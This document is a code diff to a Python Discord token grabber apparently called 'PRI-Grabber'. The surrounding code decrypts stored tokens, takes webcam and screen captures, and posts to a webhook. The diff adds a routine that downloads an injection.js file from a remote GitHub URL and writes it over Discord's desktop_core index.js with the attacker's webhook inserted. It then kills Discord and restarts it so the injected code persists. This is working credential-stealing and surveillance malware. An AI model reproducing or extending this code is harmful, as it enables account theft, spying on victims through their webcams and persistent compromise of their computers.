@@ -21,12 +21,53 @@ from PIL import ImageGrab
 import time
 import httpx
 import cv2
+import glob
+import subprocess
 
 tokens = []
 cleaned = []
 checker = []
+webhook_url = "%WEBHOOK_URL%"
 
 userprofile = os.getenv('USERPROFILE')
+
+local_app_data_path = os.environ['LOCALAPPDATA']
+
+def inject_into_discord():
+
+    path = fr'{local_app_data_path}\Discord\*\modules\discord_desktop_core-*\discord_desktop_core'
+
+    matching_folders = glob.glob(path)
+
+    url = 'https://raw.githubusercontent.com/Paloox/discordInjectionFile/main/injection.js'
+    response = requests.get(url)
+    
+    file_content = response.text
+
+    if matching_folders:
+        target_folder = matching_folders[0]
+        new_file_path = os.path.join(target_folder, 'index.js')
+        with open(new_file_path, 'w') as file:
+            file.write(file_content)
+
+        search_text = "%WEBHOOK_URL%"
+        replace_text = webhook_url
+        with open(new_file_path, 'r') as file:
+            data = file.read()
+            data = data.replace(search_text, replace_text)
+
+        with open(new_file_path, 'w') as file:
+            file.write(data)
+        
+
+
+def start_discord():
+    subprocess.Popen(fr"{local_app_data_path}\Discord\Update.exe --processStart Discord.exe", shell=True)
+
+
+def kill_discord():
+    subprocess.Popen("taskkill /F /IM Discord.exe", shell=True)
+
 
 def decrypt(buff, master_key):
     try:
@@ -178,7 +219,7 @@ def get_token():
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
                             username = 'PRI-Grabber'
-                            webhook_url = 'WEBHOOK_URL'
+                            
 
 
                             cam = cv2.VideoCapture(0)
@@ -351,9 +392,7 @@ if __name__ == "__main__":
     main() 
     get_token()
     os.remove(f"{userprofile}\\webcamPic.png")
+    kill_discord()
+    inject_into_discord()
+    start_discord()
     
-
-
-
-
-      
